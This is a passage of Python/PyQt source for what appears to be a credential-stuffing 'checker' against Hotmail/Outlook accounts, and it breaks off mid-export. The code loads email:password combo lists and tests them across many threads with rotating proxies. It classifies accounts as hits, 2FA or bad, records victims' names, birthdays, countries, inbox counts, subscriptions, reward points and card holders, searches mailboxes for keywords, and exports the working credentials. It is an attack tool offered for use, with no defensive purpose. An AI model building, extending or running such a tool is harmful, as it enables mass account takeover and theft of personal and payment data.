                if r.status=="Checking": return t("st_chk")
                return r.detail or ("✓" if r.status=="HIT" else "")
            if col==C_PTS:  return str(r.points) if r.points else ""
            if col==C_SUB:  return r.subs
            if col==C_CARD: return r.card
            if col==C_KW:   return r.kw_str    # keywords ONLY here
            if col==C_ACTION: return ""

        if role==Qt.ItemDataRole.ForegroundRole:
            if col==C_STATUS:  return QColor(ST_FG.get(r.status,C_DIM))
            if col==C_ID:      return QColor(C_DIMMER)
            if col==C_KW and r.has_kw: return QColor(C_2FA)
            if col==C_PTS and r.points: return QColor(C_HIT)
            if col==C_SUB and r.subs: return QColor(C_ACCENT)
            if col==C_DETAIL and r.status=="Checking": return QColor(C_ACCENT)
            return QColor(C_TEXT)

        if role==Qt.ItemDataRole.BackgroundRole:
            bg=ST_BG.get(r.status)
            if bg:
                if col==C_COMBO and r.status=="HIT":
                    return QColor("#0a2010")  # slightly brighter glow for HIT combo cell
                return QColor(bg)
            return QColor(C_ROW_A if idx.row()%2==0 else C_ROW_B)

        if role==Qt.ItemDataRole.FontRole:
            if col==C_STATUS:
                f=QFont("Segoe UI",9); f.setBold(r.status in ("HIT","BAD","2FA")); return f
            if col==C_COMBO:
                f=QFont("Consolas",9)
                if r.status=="HIT": f.setBold(True)
                return f
            return QFont("Segoe UI",9)

        if role==Qt.ItemDataRole.TextAlignmentRole:
            if col in (C_ID,C_STATUS): return Qt.AlignmentFlag.AlignCenter
            return Qt.AlignmentFlag.AlignVCenter|Qt.AlignmentFlag.AlignLeft

        if role==Qt.ItemDataRole.ToolTipRole:
            if col==C_COMBO:  return r.combo
            if col==C_KW:     return r.kw_str
            if col==C_DETAIL: return r.detail
            if col==C_ACTION and r.status=="HIT": return "Login required"
        return None

    def flags(self,idx):
        return Qt.ItemFlag.ItemIsEnabled|Qt.ItemFlag.ItemIsSelectable

    def add_rows(self,combos: List[str]):
        if not combos: return
        s=len(self._rows)
        self.beginInsertRows(QModelIndex(),s,s+len(combos)-1)
        for i,combo in enumerate(combos):
            pts=combo.strip().split(':',1)
            self._rows.append(Row(rid=s+i+1,combo=combo.strip(),
                email=pts[0].strip(),password=pts[1].strip() if len(pts)>1 else ''))
        self.endInsertRows()

    def update_row(self,idx:int,data:dict):
        if idx<0 or idx>=len(self._rows): return
        r=self._rows[idx]
        for k,v in data.items():
            if hasattr(r,k): setattr(r,k,v)
        self.dataChanged.emit(self.index(idx,0),self.index(idx,self.NCOLS-1))

    def clear(self):
        self.beginResetModel(); self._rows.clear(); self.endResetModel()

    def get_row(self,idx:int)->Optional[Row]:
        return self._rows[idx] if 0<=idx<len(self._rows) else None

    def get_all(self) -> List[Row]: return list(self._rows)

    def any_kw(self) -> bool:
        return any(r.has_kw for r in self._rows)


# ══════════════════════════════════════════════════════════════════════
#  FILTER MODEL
# ══════════════════════════════════════════════════════════════════════
class FilterModel(QSortFilterProxyModel):
    def __init__(self,parent=None):
        super().__init__(parent); self._f="all"

    def set_filter(self,f:str):
        self._f=f; self.invalidateFilter()

    def filterAcceptsRow(self,src_row:int,_src_parent):
        if self._f=="all": return True
        row=self.sourceModel().get_row(src_row)
        if not row: return False
        if self._f=="hits":  return row.status=="HIT"
        if self._f=="bad":   return row.status=="BAD"
        if self._f=="2fa":   return row.status=="2FA"
        if self._f=="kw":    return row.status=="HIT" and row.has_kw
        return True

    def get_visible_rows(self) -> List[Row]:
        src=self.sourceModel()
        return [src.get_row(self.mapToSource(self.index(r,0)).row())
                for r in range(self.rowCount()) if src.get_row(self.mapToSource(self.index(r,0)).row())]


# ══════════════════════════════════════════════════════════════════════
#  ACTION DELEGATE
# ══════════════════════════════════════════════════════════════════════
class ActionDelegate(QStyledItemDelegate):
    open_clicked=pyqtSignal(int)  # source row

    def paint(self,painter:QPainter,option,index):
        if index.column()!=C_ACTION:
            super().paint(painter,option,index); return
        src=index.model().mapToSource(index) if hasattr(index.model(),'mapToSource') else index
        row=index.model().sourceModel().get_row(src.row()) if hasattr(index.model(),'sourceModel') else None
        if not row: row_status=""
        else: row_status=row.status
        bg=ST_BG.get(row_status) if row else None
        painter.fillRect(option.rect,QColor(bg or (C_ROW_A if src.row()%2==0 else C_ROW_B)))
        if row_status!="HIT": return
        bw,bh=50,22
        bx=option.rect.x()+(option.rect.width()-bw)//2
        by=option.rect.y()+(option.rect.height()-bh)//2
        rect=QRect(bx,by,bw,bh)
        painter.save()
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        painter.setBrush(QBrush(QColor(C_ACCENT)))
        painter.setPen(Qt.PenStyle.NoPen)
        painter.drawRoundedRect(rect,5,5)
        painter.setPen(QPen(QColor("#fff")))
        f=QFont("Segoe UI",8,QFont.Weight.Bold); painter.setFont(f)
        painter.drawText(rect,Qt.AlignmentFlag.AlignCenter,"Open")
        painter.restore()

    def editorEvent(self,event,model,option,index):
        if index.column()==C_ACTION and event.type()==QEvent.Type.MouseButtonRelease:
            src=model.mapToSource(index) if hasattr(model,'mapToSource') else index
            row=model.sourceModel().get_row(src.row()) if hasattr(model,'sourceModel') else None
            if row and row.status=="HIT":
                self.open_clicked.emit(src.row()); return True
        return super().editorEvent(event,model,option,index)


# ══════════════════════════════════════════════════════════════════════
#  PROXY CHECK WORKER
# ══════════════════════════════════════════════════════════════════════
class ProxyCheckWorker(QThread):
    result_sig=pyqtSignal(int,str)   # idx, "LIVE"/"DEAD"
    done_sig=pyqtSignal()

    def __init__(self,proxies:List[str]):
        super().__init__(); self.proxies=proxies

    def run(self):
        def chk(args):
            i,line=args
            proxy=parse_proxy(line)
            if not proxy: self.result_sig.emit(i,"INVALID"); return
            try:
                r=requests.get("https://api.ipify.org?format=json",proxies=proxy,timeout=8,verify=False)
                self.result_sig.emit(i,"LIVE" if r.status_code==200 else "DEAD")
            except Exception: self.result_sig.emit(i,"DEAD")
        with ThreadPoolExecutor(max_workers=20) as ex:
            ex.map(chk,enumerate(self.proxies))
        self.done_sig.emit()


# ══════════════════════════════════════════════════════════════════════
#  WORKER THREAD
# ══════════════════════════════════════════════════════════════════════
class WorkerThread(QThread):
    row_sig  = pyqtSignal(int,dict)
    done_sig = pyqtSignal(dict)

    def __init__(self,combos,mode,threads,keywords,debug,rm,stats,proxies,use_proxy):
        super().__init__()
        self.combos=combos; self.mode=mode; self.threads=threads
        self.keywords=keywords; self.debug=debug; self.rm=rm; self.stats=stats
        self.proxies=proxies; self.use_proxy=use_proxy
        self._stop=threading.Event()

    def request_stop(self): self._stop.set()

    def _pick_proxy(self):
        if self.use_proxy and self.proxies:
            return parse_proxy(random.choice(self.proxies))
        return None

    def run(self):
        oc=HotmailChecker(debug=self.debug)

        def work(args):
            idx,combo=args
            if self._stop.is_set(): return
            self.row_sig.emit(idx,{'status':'Checking'})
            pts=combo.strip().split(':',1)
            if len(pts)<2:
                self.stats.update('BAD')
                self.row_sig.emit(idx,{'status':'BAD','detail':'invalid format'}); return
            em,pw=pts[0].strip(),pts[1].strip()
            proxy=self._pick_proxy()
            try:
                m=self.mode
                if   m==1: res=oc.check_mode1(em,pw,proxy)
                elif m==2: res=oc.check_mode2(em,pw,self.keywords,proxy)
                elif m==3: res=oc.check_mode3(em,pw,proxy)
                else:      res=oc.check_mode4(em,pw,self.keywords,proxy)
            except Exception as e:
                res={'status':'ERROR','email':em,'password':pw,'mode':self.mode,'detail':str(e)[:80]}

            s=res.get('status','BAD')
            self.stats.update('BAD' if s=='ERROR' else s)

            # Build subs string
            subs_list=res.get('subs_list',[])
            subs_str=', '.join(subs_list) if subs_list else ''

            # Build detail — country is NOT part of detail here
            dp=[]
            if s=='HIT':
                if res.get('points',0): dp.append(f"pts:{res['points']}")
                if res.get('total_inbox',0): dp.append(f"inbox:{res['total_inbox']}")
                if res.get('balance'): dp.append(f"bal:{res['balance']}")
                kf={k:v['count'] for k,v in (res.get('kw_results',{})).items() if v.get('found')}
                if kf: dp.append('kw:'+','.join(f"{k}({n})" for k,n in kf.items()))

            upd={
                'status':   s,
                'name':     res.get('display_name',''),
                'cc':       res.get('cc',''),         # ISO-2 only
                'country':  res.get('country',''),    # full name (stored, not shown in C_COUNTRY)
                'birthday': res.get('dob',''),
                'inbox':    res.get('total_inbox',0),
                'kw_res':   res.get('kw_results',{}),  # keywords go to kw_res
                'points':   res.get('points',0),
                'subs':     subs_str,
                'card':     res.get('card_holder','') or '',
                'detail':   '  ·  '.join(dp) if dp else res.get('detail',''),
            }
            self.row_sig.emit(idx,upd)
            self.rm.save(res)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            ex.map(work,enumerate(self.combos))

        st=self.stats
        self.done_sig.emit({'hits':st.hits,'two_fa':st.two_fa,'bad':st.bad,
                            'checked':st.checked,'folder':self.rm.folder})


# ══════════════════════════════════════════════════════════════════════
#  QSS
# ══════════════════════════════════════════════════════════════════════
def qss()->str:
    return f"""
* {{ font-family:'Segoe UI','Inter','Arial',sans-serif; font-size:12px; }}
QMainWindow,QWidget {{ background:{C_BG}; color:{C_TEXT}; }}

QFrame#sidebar {{
    background:{C_SIDEBAR};
    border-right:1px solid {C_BORDER};
}}
QFrame#topbar {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #0a1628,stop:1 #0e1a30);
    border-bottom:1px solid {C_BORDER};
}}
QFrame#card {{
    background:qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #111827,stop:1 #0d1520);
    border:1px solid {C_BORDER};
    border-radius:12px;
}}
QFrame#tabcard {{ background:{C_PANEL}; border:1px solid {C_BORDER}; border-radius:9px; }}
QLabel {{ background:transparent; color:{C_TEXT}; }}
QLabel#dim {{ color:{C_DIM}; font-size:9px; letter-spacing:1.6px; font-weight:bold; }}

QPushButton {{
    background:{C_PANEL2}; color:{C_DIM}; border:1px solid {C_BORDER};
    border-radius:7px; padding:5px 16px; font-size:12px;
}}
QPushButton:hover {{ background:{C_BORDER2}; color:{C_TEXT}; border-color:{C_ACCENT}; }}
QPushButton:pressed {{ background:{C_ACP}; color:#fff; border-color:{C_ACP}; }}
QPushButton:disabled {{ color:#2d3a4a; border-color:{C_BORDER}; background:#090e16; }}

QPushButton#accent {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C_ACCENT},stop:1 {C_ACH});
    color:#fff; border:none; font-weight:bold; border-radius:7px;
}}
QPushButton#accent:hover {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C_ACH},stop:1 #6db8ff);
}}

QPushButton#btn_start {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #1e7a34,stop:1 {C_HIT});
    color:#fff; border:none; font-weight:bold; font-size:13px; border-radius:9px;
    letter-spacing:0.5px;
}}
QPushButton#btn_start:hover {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C_HIT},stop:1 #5de078);
}}
QPushButton#btn_start:disabled {{ background:#071509; color:#112a18; border:none; }}

QPushButton#btn_stop {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #a01828,stop:1 {C_BAD});
    color:#fff; border:none; font-weight:bold; font-size:13px; border-radius:9px;
}}
QPushButton#btn_stop:hover {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C_BAD},stop:1 #ff8080);
}}
QPushButton#btn_stop:disabled {{ background:#0d0307; color:#2a0a0a; border:none; }}

QPushButton#nav_btn {{
    background:transparent; color:{C_DIM}; border:none; border-radius:0px;
    padding:10px 20px; text-align:left; font-size:12px; font-weight:500;
}}
QPushButton#nav_btn:hover {{ background:rgba(45,136,255,0.08); color:{C_TEXT}; }}
QPushButton#nav_btn:checked {{
    background:rgba(45,136,255,0.12); color:{C_ACCENT};
    border-bottom:2px solid {C_ACCENT}; font-weight:bold;
}}

QPushButton#filter_btn {{
    background:{C_PANEL2}; color:{C_DIM}; border:1px solid {C_BORDER};
    border-radius:20px; padding:4px 16px; font-size:11px;
}}
QPushButton#filter_btn:hover {{ color:{C_TEXT}; border-color:{C_ACCENT}; background:{C_BORDER}; }}
QPushButton#filter_btn:checked {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C_ACCENT},stop:1 {C_ACH});
    color:#fff; border-color:{C_ACCENT};
}}

QPushButton#founder {{
    background:transparent; color:{C_ACCENT}; border:none; font-size:11px; padding:1px 4px;
    text-decoration:underline;
}}
QPushButton#founder:hover {{ color:{C_ACH}; }}

QComboBox {{
    background:{C_PANEL2}; color:{C_TEXT}; border:1px solid {C_BORDER};
    border-radius:7px; padding:5px 10px;
}}
QComboBox:hover,QComboBox:focus {{ border-color:{C_ACCENT}; }}
QComboBox::drop-down {{ border:none; width:20px; }}
QComboBox QAbstractItemView {{
    background:{C_PANEL}; color:{C_TEXT}; border:1px solid {C_BORDER2};
    selection-background-color:{C_ACCENT}; outline:none; padding:4px;
}}

QLineEdit {{
    background:{C_PANEL2}; color:{C_TEXT}; border:1px solid {C_BORDER};
    border-radius:7px; padding:5px 10px;
}}
QLineEdit:focus {{ border-color:{C_ACCENT}; background:#111b2b; }}

QTextEdit {{
    background:{C_PANEL2}; color:{C_TEXT}; border:1px solid {C_BORDER};
    border-radius:7px; font-family:Consolas,monospace; font-size:11px; padding:6px;
}}
QTextEdit:focus {{ border-color:{C_ACCENT}; }}

QSlider::groove:horizontal {{ height:5px; background:{C_BORDER}; border-radius:3px; }}
QSlider::sub-page:horizontal {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C_ACP},stop:1 {C_ACCENT});
    border-radius:3px;
}}
QSlider::handle:horizontal {{
    background:{C_ACCENT}; border:2px solid {C_BG};
    width:16px; height:16px; margin:-6px 0; border-radius:8px;
}}
QSlider::handle:horizontal:hover {{ background:{C_ACH}; }}

QCheckBox {{ color:{C_DIM}; spacing:7px; font-size:12px; }}
QCheckBox::indicator {{
    width:15px; height:15px; border:1px solid {C_BORDER2}; border-radius:4px; background:{C_PANEL2};
}}
QCheckBox::indicator:checked {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 {C_ACCENT},stop:1 {C_ACP});
    border-color:{C_ACCENT};
}}

QTableView {{
    background:{C_TBL}; color:{C_TEXT}; border:none;
    gridline-color:{C_BORDER}; selection-background-color:{C_SEL};
    selection-color:{C_TEXT}; outline:none;
}}
QTableView::item {{ padding:4px 10px; border-bottom:1px solid {C_BORDER}; min-height:38px; }}
QTableView::item:hover {{ background:#0f1e38; }}
QTableView::item:selected {{ background:{C_SEL}; color:#fff; }}

QHeaderView {{ background:{C_PANEL}; border:none; }}
QHeaderView::section {{
    background:qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #141e2e,stop:1 #0f1622);
    color:{C_DIM}; border:none;
    border-right:1px solid {C_BORDER};
    border-bottom:2px solid {C_ACCENT};
    padding:6px 10px; font-size:10px; font-weight:bold; letter-spacing:1.2px;
}}
QHeaderView::section:hover {{ color:{C_TEXT}; background:#1a2540; }}

QScrollBar:vertical {{ background:{C_TBL}; width:6px; border:none; margin:0; }}
QScrollBar::handle:vertical {{ background:{C_BORDER2}; border-radius:3px; min-height:30px; }}
QScrollBar::handle:vertical:hover {{ background:{C_ACCENT}; }}
QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical {{ height:0; }}
QScrollBar:horizontal {{ background:{C_TBL}; height:6px; border:none; }}
QScrollBar::handle:horizontal {{ background:{C_BORDER2}; border-radius:3px; min-width:30px; }}
QScrollBar::handle:horizontal:hover {{ background:{C_ACCENT}; }}
QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal {{ width:0; }}

QProgressBar {{
    background:{C_BORDER}; border:none; border-radius:3px; height:5px;
}}
QProgressBar::chunk {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C_ACCENT},stop:0.6 #4da6ff,stop:1 {C_HIT});
    border-radius:3px;
}}
QListWidget {{
    background:{C_PANEL2}; color:{C_TEXT}; border:1px solid {C_BORDER};
    border-radius:8px; outline:none;
}}
QListWidget::item {{ padding:5px 10px; border-bottom:1px solid {C_BORDER}; }}
QListWidget::item:hover {{ background:{C_PANEL}; }}
QListWidget::item:selected {{ background:{C_SEL}; color:#fff; }}
QSplitter::handle {{ background:{C_BORDER}; }}
QScrollArea {{ background:transparent; border:none; }}
"""



# ══════════════════════════════════════════════════════════════════════
#  SMALL WIDGET HELPERS
# ══════════════════════════════════════════════════════════════════════
def _sep()->QFrame:
    f=QFrame(); f.setFixedHeight(1)
    f.setStyleSheet(f"background:{C_BORDER}; border:none; margin:2px 0;")
    return f

def _slbl(key:str)->QLabel:
    l=QLabel(t(key)); l.setObjectName("dim"); l.setProperty("i18n_key",key)
    f=QFont("Segoe UI",8,QFont.Weight.Bold)
    f.setLetterSpacing(QFont.SpacingType.AbsoluteSpacing,1.4)
    l.setFont(f); l.setContentsMargins(0,6,0,2); return l


class StatCard(QFrame):
    def __init__(self,key:str,color:str=C_TEXT,parent=None):
        super().__init__(parent); self.setObjectName("card"); self._key=key
        self.setMinimumWidth(100)
        lo=QVBoxLayout(self); lo.setContentsMargins(18,14,18,14); lo.setSpacing(4)
        self._val=QLabel("0"); self._val.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self._val.setFont(QFont("Segoe UI",32,QFont.Weight.Bold))
        self._val.setStyleSheet(f"color:{color}; background:transparent;")
        lo.addWidget(self._val)
        self._lbl=QLabel(t(key).upper()); self._lbl.setObjectName("dim")
        self._lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        f=QFont("Segoe UI",8,QFont.Weight.Bold)
        f.setLetterSpacing(QFont.SpacingType.AbsoluteSpacing,1.5); self._lbl.setFont(f)
        lo.addWidget(self._lbl)

    def set(self,v): self._val.setText(str(v))
    def retranslate(self): self._lbl.setText(t(self._key).upper())


# ══════════════════════════════════════════════════════════════════════
#  FILTER BAR
# ══════════════════════════════════════════════════════════════════════
class FilterBar(QWidget):
    changed=pyqtSignal(str)

    def __init__(self,parent=None):
        super().__init__(parent)
        self.setStyleSheet("background:transparent;")
        lo=QHBoxLayout(self); lo.setContentsMargins(0,0,0,0); lo.setSpacing(4)
        self._btns: Dict[str,QPushButton]={}
        for key,lbl_key in [("all","f_all"),("kw","f_kw"),("hits","f_hits"),("bad","f_bad"),("2fa","f_2fa")]:
            btn=QPushButton(t(lbl_key)); btn.setObjectName("filter_btn")
            btn.setCheckable(True); btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.setProperty("i18n_key",lbl_key)
            btn.clicked.connect(lambda _,k=key: self._pick(k))
            self._btns[key]=btn; lo.addWidget(btn)
        lo.addStretch()
        self._btns["all"].setChecked(True); self._cur="all"

    def _pick(self,key:str):
        for k,b in self._btns.items(): b.setChecked(k==key)
        self._cur=key; self.changed.emit(key)

    def set_kw_visible(self,v:bool):
        self._btns["kw"].setVisible(v)
        if not v and self._cur=="kw": self._pick("all")

    def retranslate(self):
        for key,btn in self._btns.items():
            k=btn.property("i18n_key")
            if k: btn.setText(t(k))


# ══════════════════════════════════════════════════════════════════════
#  DASHBOARD TAB
# ══════════════════════════════════════════════════════════════════════
class DashboardTab(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        lo=QVBoxLayout(self); lo.setContentsMargins(28,28,28,28); lo.setSpacing(20)

        # Title
        ttl=QLabel("DASHBOARD")
        ttl.setFont(QFont("Segoe UI",13,QFont.Weight.Bold))
        ttl.setStyleSheet(f"color:{C_TEXT};letter-spacing:2px;"); lo.addWidget(ttl)

        sub=QLabel("Real-time checking statistics")
        sub.setStyleSheet(f"color:{C_DIM};font-size:11px;"); lo.addWidget(sub)

        # Stat cards
        row=QHBoxLayout(); row.setSpacing(14)
        self.c_total  =StatCard("total",C_TEXT)
        self.c_checked=StatCard("checked","#58a6ff")
        self.c_hit    =StatCard("hit",C_HIT)
        self.c_2fa    =StatCard("tfa",C_2FA)
        self.c_bad    =StatCard("bad",C_BAD)
        self.c_cpm    =StatCard("cpm",C_ACCENT)
        for c in (self.c_total,self.c_checked,self.c_hit,self.c_2fa,self.c_bad,self.c_cpm):
            row.addWidget(c,1)
        lo.addLayout(row)

        # Progress
        pr=QHBoxLayout(); pr.setSpacing(8)
        self.progress=QProgressBar(); self.progress.setRange(0,100)
        self.progress.setValue(0); self.progress.setTextVisible(False); self.progress.setFixedHeight(6)
        self.prog_lbl=QLabel("0 / 0")
        self.prog_lbl.setStyleSheet(f"color:{C_DIM}; font-size:11px;")
        self.prog_lbl.setFixedWidth(80)
        self.prog_lbl.setAlignment(Qt.AlignmentFlag.AlignRight|Qt.AlignmentFlag.AlignVCenter)
        pr.addWidget(self.progress); pr.addWidget(self.prog_lbl); lo.addLayout(pr)

        lo.addStretch()

    def update_stats(self,stats:Stats):
        self.c_checked.set(stats.checked); self.c_hit.set(stats.hits)
        self.c_2fa.set(stats.two_fa); self.c_bad.set(stats.bad)
        self.c_cpm.set(f"{stats.cpm:.0f}")
        n=stats.total; ch=stats.checked
        self.prog_lbl.setText(f"{ch} / {n}")
        self.progress.setValue(int(ch/n*100) if n else 0)

    def set_total(self,n:int):
        self.c_total.set(n)
        self.prog_lbl.setText(f"0 / {n}")
        self.progress.setValue(0)

    def retranslate(self):
        for c in (self.c_total,self.c_checked,self.c_hit,self.c_2fa,self.c_bad,self.c_cpm):
            c.retranslate()


# ══════════════════════════════════════════════════════════════════════
#  CHECKER TAB
# ══════════════════════════════════════════════════════════════════════
class CheckerTab(QWidget):
    def __init__(self,src_model:AccountModel,filter_model:FilterModel,parent=None):
        super().__init__(parent)
        self._src=src_model; self._flt=filter_model
        lo=QVBoxLayout(self); lo.setContentsMargins(0,0,0,0); lo.setSpacing(0)

        # ── header row ──
        hdr=QFrame(); hdr.setObjectName("tabcard")
        hdr.setStyleSheet(f"QFrame#tabcard{{background:{C_PANEL};border:none;border-bottom:1px solid {C_BORDER};}}")
        hl=QHBoxLayout(hdr); hl.setContentsMargins(14,8,14,8); hl.setSpacing(8)

        self._acc_lbl=QLabel(t("no_acc"))
        self._acc_lbl.setStyleSheet(f"color:{C_DIM}; font-size:11px;"); hl.addWidget(self._acc_lbl)
        hl.addStretch()

        self._btn_load=QPushButton(t("load_file"))
        self._btn_load.setObjectName("accent"); self._btn_load.setFixedHeight(30)
        self._btn_load.setCursor(Qt.CursorShape.PointingHandCursor); hl.addWidget(self._btn_load)

        self._btn_paste=QPushButton(t("paste")); self._btn_paste.setFixedHeight(30)
        self._btn_paste.setCursor(Qt.CursorShape.PointingHandCursor); hl.addWidget(self._btn_paste)

        self._btn_clear=QPushButton(t("clear")); self._btn_clear.setFixedHeight(30)
        self._btn_clear.setStyleSheet(f"color:{C_BAD};")
        self._btn_clear.setCursor(Qt.CursorShape.PointingHandCursor); hl.addWidget(self._btn_clear)
        self._btn_hide_combo=QPushButton("👁")
        self._btn_hide_combo.setFixedSize(30,30); self._btn_hide_combo.setCheckable(True)
        self._btn_hide_combo.setToolTip("Hide / Show Email:Pass")
        self._btn_hide_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_hide_combo.setStyleSheet(
            f"QPushButton{{background:{C_PANEL2};color:{C_DIM};border:1px solid {C_BORDER};"
            f"border-radius:6px;font-size:14px;padding:0;}}"
            f"QPushButton:checked{{color:{C_ACCENT};border-color:{C_ACCENT};}}"
        )
        self._btn_hide_combo.clicked.connect(self._toggle_combo_col); hl.addWidget(self._btn_hide_combo)

        lo.addWidget(hdr)

        # ── paste box (hidden) ──
        self._paste_frame=QWidget(); self._paste_frame.setVisible(False)
        self._paste_frame.setStyleSheet(f"background:{C_PANEL};")
        pfl=QHBoxLayout(self._paste_frame); pfl.setContentsMargins(14,6,14,6); pfl.setSpacing(8)
        self._paste_box=QTextEdit(); self._paste_box.setFixedHeight(72)
        self._paste_box.setPlaceholderText(t("paste_ph")); pfl.addWidget(self._paste_box)
        self._btn_lp=QPushButton(t("load_pasted")); self._btn_lp.setObjectName("accent")
        self._btn_lp.setFixedSize(80,30); self._btn_lp.setCursor(Qt.CursorShape.PointingHandCursor)
        pfl.addWidget(self._btn_lp,0,Qt.AlignmentFlag.AlignBottom)
        lo.addWidget(self._paste_frame)

        # ── filter + export bar ──
        fb=QWidget(); fb.setStyleSheet(f"background:{C_PANEL2};")
        fbl=QHBoxLayout(fb); fbl.setContentsMargins(14,6,14,6); fbl.setSpacing(6)
        self.filter_bar=FilterBar(); fbl.addWidget(self.filter_bar)
        fbl.addStretch()
        self._btn_txt=QPushButton(t("export_txt")); self._btn_txt.setFixedHeight(26)
        self._btn_txt.setCursor(Qt.CursorShape.PointingHandCursor); fbl.addWidget(self._btn_txt)
        self._btn_xls=QPushButton(t("export_xls")); self._btn_xls.setFixedHeight(26)
        self._btn_xls.setCursor(Qt.CursorShape.PointingHandCursor); fbl.addWidget(self._btn_xls)
        self._btn_pdf=QPushButton(t("export_pdf")); self._btn_pdf.setFixedHeight(26)
        self._btn_pdf.setCursor(Qt.CursorShape.PointingHandCursor); fbl.addWidget(self._btn_pdf)
        lo.addWidget(fb)

        # ── table ──
        self.table=QTableView()
        self.table.setModel(self._flt)
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setSelectionMode(QAbstractItemView.SelectionMode.ExtendedSelection)
        self.table.setShowGrid(True)
        self.table.verticalHeader().setVisible(False)
        self.table.verticalHeader().setDefaultSectionSize(38)
        self.table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.setAlternatingRowColors(False)  # handled by model
        self.table.clicked.connect(self._on_click)
        self.table.selectionModel().selectionChanged.connect(self._update_sel_count)

        self._act_del=ActionDelegate(self.table)
        self._act_del.open_clicked.connect(self._open_outlook)
        self.table.setItemDelegateForColumn(C_ACTION,self._act_del)

        hh=self.table.horizontalHeader()
        hh.setDefaultAlignment(Qt.AlignmentFlag.AlignLeft|Qt.AlignmentFlag.AlignVCenter)
        for col in range(12):
            hh.setSectionResizeMode(col,QHeaderView.ResizeMode.Interactive)
            self.table.setColumnWidth(col,COL_W[col])
        hh.setSectionResizeMode(C_COMBO,QHeaderView.ResizeMode.Stretch)
        lo.addWidget(self.table,1)

        # ── status bar ──
        sb=QFrame(); sb.setFixedHeight(26)
        sb.setStyleSheet(f"background:{C_PANEL};border-top:1px solid {C_BORDER};")
        sbl=QHBoxLayout(sb); sbl.setContentsMargins(10,0,10,0); sbl.setSpacing(0)
        def _sb(txt,col):
            l=QLabel(txt)
            l.setStyleSheet(f"color:{col};font-size:11px;background:transparent;padding:0 14px 0 0;")
            return l
        self._sb_total  =_sb("Total accounts: 0", C_DIM)
        self._sb_sel    =_sb("Selected: 0",      C_DIM)
        self._sb_access =_sb("Access: 0",         C_HIT)
        self._sb_2fa    =_sb("2FA: 0",            C_2FA)
        self._sb_wrong  =_sb("Wrong: 0",          C_BAD)
        self._sb_blkip  =_sb("Block IP: 0",       C_DIM)
        self._sb_blkem  =_sb("Block Email: 0",    C_DIM)
        self._copy_tip  =_sb("",                  C_HIT)
        for w in (self._sb_total,self._sb_sel,self._sb_access,
                  self._sb_2fa,self._sb_wrong,self._sb_blkip,self._sb_blkem):
            sbl.addWidget(w)
        sbl.addStretch(); sbl.addWidget(self._copy_tip)
        lo.addWidget(sb)

        # connect buttons
        self.filter_bar.changed.connect(self._flt.set_filter)
        self._btn_txt.clicked.connect(lambda: self._export("txt"))
        self._btn_xls.clicked.connect(lambda: self._export("xls"))
        self._btn_pdf.clicked.connect(lambda: self._export("pdf"))
        self._paste_frame.setVisible(False)
        self._btn_paste.clicked.connect(self._toggle_paste)
        self._btn_lp.clicked.connect(self._load_pasted)

    def _on_click(self,proxy_idx):
        col=proxy_idx.column()
        if col==C_ACTION:
            src=self._flt.mapToSource(proxy_idx)
            self._open_outlook(src.row())
        elif col==C_COMBO:
            src=self._flt.mapToSource(proxy_idx)
            row=self._src.get_row(src.row())
            if row:
                QApplication.clipboard().setText(row.combo)
                self._copy_tip.setText(f"✔  Copied!")
                QTimer.singleShot(2000,lambda: self._copy_tip.setText(""))

    def _open_outlook(self,src_row:int):
        row=self._src.get_row(src_row)
        if row and row.status=="HIT":
            webbrowser.open(f"https://outlook.live.com/mail/?login_hint={quote(row.email)}")

    def apply_mode_cols(self,mode:int):
        visible=set(MODE_COLS.get(mode,MODE_COLS[1]))
        for col in range(12):
            self.table.setColumnHidden(col,col not in visible)

    def update_kw_filter(self):
        self.filter_bar.set_kw_visible(self._src.any_kw())

    def _toggle_paste(self):
        self._paste_frame.setVisible(not self._paste_frame.isVisible())

    def _load_pasted(self):
        lines=self._paste_box.toPlainText().splitlines()
        combos=_parse_combos(lines)
        if combos:
            self._paste_frame.setVisible(False)
            self.window()._load_accounts(combos,"clipboard")

    def _export(self,fmt:str):
        rows=self._flt.get_visible_rows()
        if not rows:
            QMessageBox.information(self,"Export","No rows to export."); return
        if fmt=="txt":
            p,_=QFileDialog.getSaveFileName(self,"Export TXT","export.txt","Text (*.txt)")
            if not p: return
            with open(p,'w',encoding='utf-8') as f:
                for r in rows: f.write(r.combo+'\n')
            QMessageBox.information(self,"Export",t("msg_export",n=len(rows),p=p))
        elif fmt=="xls":
            p,_=QFileDialog.getSaveFileName(self,"Export Excel","export.xlsx","Excel (*.xlsx)")
            if not p: return
            try:
                import openpyxl
                wb=openpyxl.Workbook(); ws=wb.active; ws.title="Results"
                ws.append(["ID","Email:Password","Name","Country","Birthday","Status","Detail","Points","Subscription","Card","Keywords"])
                for r in rows:
                    ws.append([r.rid,r.combo,r.name,r.cc,r.birthday,r.status,r.detail,r.points,r.subs,r.card,r.kw_str])
                wb.save(p); QMessageBox.information(self,"Export",t("msg_export",n=len(rows),p=p))
            except ImportError:
                QMessageBox.warning(self,"Export",t("no_xl"))
            except Exception as e:
